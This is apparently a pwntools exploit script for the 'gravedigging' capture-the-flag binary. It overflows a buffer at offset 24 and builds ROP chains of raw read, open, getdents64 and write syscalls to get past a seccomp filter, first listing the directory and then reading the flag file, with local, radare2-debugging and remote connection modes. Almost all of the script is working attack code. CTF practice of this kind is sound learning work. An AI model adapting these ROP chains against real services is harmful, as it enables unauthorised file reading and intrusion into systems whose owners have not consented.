#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./gravedigging")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db 0x004011cf; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


rop = ROP(exe)
def read_dir_chain(bof, buffer, current_dir, size):
    global rop
    return flat({
        bof:[
        # read the current dir name
        rop.rax[0], 0,
        rop.rdi[0], 0,
        rop.rsi[0], buffer,
        rop.rdx[0], len(current_dir),
        rop.syscall[0],
        
        # open directory with open
        rop.rax[0], 2,
        rop.rdi[0], buffer,
        rop.rsi[0], 0,
        rop.rdx[0], 0,
        rop.syscall[0],
        
        # read content directory
        rop.rax[0], 217,
        rop.rdi[0], 3,
        rop.rsi[0], buffer,
        rop.rdx[0], size,
        rop.syscall[0],

        # write the content to stout
        rop.rax[0], 1,
        rop.rdi[0], 1,
        rop.rsi[0], buffer,
        rop.rdx[0], size,
        rop.syscall[0],
        ]
    })

def read_file_chain(bof, filename, buffer, read_size):
    global rop
    return flat({
        bof:[
        # input the file name (read)
        rop.rax[0], 0,
        rop.rdi[0], 0,
        rop.rsi[0], buffer,
        rop.rdx[0], len(filename),
        rop.syscall[0],
        
        # open file
        rop.rax[0], 2,
        rop.rdi[0], buffer,
        rop.rsi[0], 0,
        rop.rdx[0], 0,
        rop.syscall[0],

        # read the content
        rop.rax[0], 0,
        rop.rdi[0], 3,
        rop.rsi[0], buffer,
        rop.rdx[0], read_size,
        rop.syscall[0],

        # write the content
        rop.rax[0], 1,
        rop.rdi[0], 1,
        rop.rsi[0], buffer,
        rop.rdx[0], read_size,
        rop.syscall[0],

        ]
    })


io = start()
bof = 24
buffer = exe.bss()
current_dir = b'./'
size = 300

# seccomp filters all che syscall except for
# few ones. Read, write and getdents64

payload = read_dir_chain(bof, buffer, current_dir, size)
io.sendline(payload)
io.sendlineafter(b'search?\n', current_dir)
data = io.recv(size)
info(f"raw data: {''.join(chr(c) for c in data if 32 <= c < 127)}")
io.close()


io = start()
# i'm' tired i just paste it here
grave_name = b'Sara Flagg 1990, 2025 -- she sure loved ctfs'
payload = read_file_chain(bof, grave_name, buffer, size)
io.sendline(payload)
io.sendlineafter(b'search?\n', grave_name)
data = io.recvregex(rb'deadface\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()